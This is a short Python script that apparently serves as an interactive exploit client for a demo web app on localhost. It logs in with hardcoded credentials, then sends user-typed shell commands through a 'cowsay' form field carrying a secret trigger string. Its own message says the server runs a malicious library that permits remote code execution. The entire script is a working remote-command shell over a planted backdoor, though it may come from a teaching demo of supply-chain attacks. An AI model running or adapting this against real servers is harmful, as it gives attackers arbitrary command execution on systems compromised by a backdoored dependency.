import requests
import re

HOST = "http://localhost:8888"
ss = requests.Session()
result_re = re.compile(r"""<pre>(?P<result>.*)</pre>""",
                       re.MULTILINE | re.DOTALL)

# Normal login
ss.post(HOST + "/login", data={"username": "steve",
        "password": "password"}, allow_redirects=False)

HACKER_SECRET = "!@#${}"

print("Server using malicious library so we can RCE anytime")
print("Enter command:")
cmd = input(">>")
while cmd and cmd != "exit":
  resp = ss.post(HOST + "/2", data={"cowsay": HACKER_SECRET.format(cmd)})
  mo = result_re.search(resp.text)
  if mo:
    print(mo.group("result"))
  cmd = input(">>")
